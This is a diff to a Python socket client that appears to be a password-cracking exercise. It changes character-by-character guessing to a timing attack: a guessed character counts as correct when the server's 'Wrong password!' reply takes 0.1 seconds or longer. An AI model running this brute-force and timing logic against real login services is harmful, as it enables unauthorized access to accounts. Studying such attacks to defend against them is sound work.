@@ -3,6 +3,7 @@ import sys
 import logging
 import string
 import json
+import time
 
 
 class Logger:
@@ -47,9 +48,10 @@ def connect_to_server(host, port, logins):
     successful_login = {
         "result": "Connection success!"
     }
-    exception_msg = {
-        "result": "Exception happened during login"
+    wrong_password_msg = {
+        "result": "Wrong password!"
     }
+    time_list = []
     try:
         with socket.socket() as client_socket:
             logger.info(f"Attempting to connect to {host}:{port}")
@@ -70,11 +72,16 @@ def connect_to_server(host, port, logins):
                     logger.info(f"Trying password: {current_password}")
                     encoded_credentials_file = json.dumps(credentials_dict_password)
                     client_socket.sendall(encoded_credentials_file.encode('utf-8'))
-
+                    start = time.perf_counter()
                     response = client_socket.recv(1024).decode('utf-8')
-                    decoded_json_response = json.loads(response)
+                    end = time.perf_counter()
+                    total_time = end - start
+                    time_list.append(total_time)
 
-                    if decoded_json_response == exception_msg:
+                    logger.info(f"Your program has executed for {total_time} seconds.")
+                    decoded_json_response = json.loads(response)
+                    logger.info(f"{decoded_json_response}")
+                    if decoded_json_response == wrong_password_msg and total_time >= 0.1:
                         password += char
                         found_character = True
                         logger.info(f"Found character '{char}'. Current password: '{password}'")
@@ -94,6 +101,7 @@ def connect_to_server(host, port, logins):
         logger.error(f"{e.__class__.__name__} occurred: ConnectionAbortedError")
     except socket.error as e:
         logger.error(f"Socket error occurred: {e}")
+    logger.info(f"{time_list}")
 
 
 def attempt_all_logins(logins, client_socket):
